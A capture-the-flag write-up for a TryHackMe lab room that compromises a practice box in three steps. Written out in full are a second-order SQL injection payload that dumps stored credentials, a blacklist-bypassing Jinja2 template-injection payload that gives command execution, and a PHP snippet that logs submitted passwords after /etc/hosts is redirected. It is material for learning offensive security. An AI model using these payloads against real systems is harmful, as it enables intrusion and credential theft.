# Second

https://tryhackme.com/room/fearsecond - rated Hard at time of completion.

Quite a fun little room! The entry point had me stumped for a while, due to bad assumptions, but I will get to that in a moment.

1. Initial scans revealed ports **22** and **8000** exposed. On 8000 was a website where you needed to login, could register an account, and once in would give you a form field to enter text into and a button that would count the words you entered. Notably, when you entered text and submitted, the result would be presented as 'There are X words USERNAME'. Response headers indicated a python site, so immediately expecting some form of SSTI (the room's name 'Second' is a hint towards second order injection, meaning the username you register can be used for injection) I spent a while (okay a few hours over two attempts) trying to find a working SSTI payload for Jinja2 etc, without luck.
2. The only response I could get for it was if I used a comma `'` in the username, which would cause a server error. But... that didn't make sense: usually only SQL injections caused that problem. And my username was in the cookie etc, it was clearly some sort of template engine, couldn't be SQL. Spoiler, it was SQL injection. Either the author was clever to misdirect me, or I'm an idiot. A little column a, a little column b? Anyway, a username like `' union select 1,group_concat(username,password),3,4 from users -- ` was sufficient to print the usernames and passwords for the site, which were mainly my own garbage plus the password for a user name 'smokey'.
3. With smokey's creds I could log in over SSH. There was no user flag yet though: a user named Hazel also existed so lateral movement to that user was required. Examining the system with linpeas revealed several interesting facts:

  - There was the site I accessed on port 8000, hosted from /var/opt/app and run by smokey
  - There was a second site on port 5000, hosted from /opt/app and run by hazel
  - There was a third site with the alias dev_site.thm hosted on port 8080 from /var/www/dev_site, run by www_data
  - I had the credentials for the MySQL database, with the same creds in config.php or app.py across the sites
  - Finally, Hazel as well as root had write access over the /etc/hosts file, which mapped dev_site.thm to localhost.

4. To move to Hazel, the site she was running at 5000 was examined. To browse it, I proxied it with SSH through to the attack box with the command: `ssh -L 8000:localhost:5000 smokey@10.10.1.245`. It was a simpler version of the original site, with registration and login but no word counter. Instead it would print the user's name in a welcoming message. A bit of examination of the code revealed that this *was* likely SSTI, Jinja2 specifically. And the code for the page had a black list that further confirmed this, disabling some common tokens used in payloads: `blacklist = ["config","self","_",'"']`.
5. Fortunately, in [another room](https://github.com/ChrisPritchard/ctf-writeups/blob/master/tryhackme-rooms/keldagrim.md) I had done there had been a similar filter and I was able to get a quick working payload to bypass this filter and achieve RCE: `/{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}`. This uses no underscores or quotes, hex encoding and pipes to execute the `id` command. I ran this and got the user `hazel` printed.
6. Unlike that other room, I couldn't get a reverse shell working as there seemed to be a size limit. However, I created a reverse_ssh client and ran that instead of id to get a reverse shell (the same could be achived by creating a metasploit payload, or even simpler just an executable shell script).
7. As hazel I had access to the user flag, and a note that said another developer, smokey again, would be logging in to the dev site every now and then to check her process. Looking at the dev site, which was basically just a login form, the username in the database (which I could see with the database credentials all sites used) was smokey, but the password was bcrypted and unbreakable. I guessed (correctly as it turned out) that this password was for root.
8. As Hazel had write access over /etc/hosts, the path forward was to re-host something on the attack box on port 8080, alter hosts to point dev_site.thm to the attack box, then capture the smokey user's password as he entered it. To do this I copied the contents of the dev_site.thm's index.php to the attack box, and added the following code at its head:

  ```php
  if($_SERVER["REQUEST_METHOD"] == "POST"){
    file_put_contents('log.txt',$_POST['password'],FILE_APPEND);
  }
  ```
  
To host this I installed the php cli on the attack box, then hosted a dev server with `php -S 0.0.0.0:8080`. I then tested this by browsing to the attack boxes IP port 8080 and trying to log in, seeing the password I entered added to log.txt.
9. After a few minutes the file updated and I saw a log entry from the php cli showing the page had been browsed. Checking log.txt I got a new password which worked for the root account. In the root directory was the final flag.

So yes, a nice three step room! Got to love a little SSTI, and the rehosting / site hosts thing was neat :)
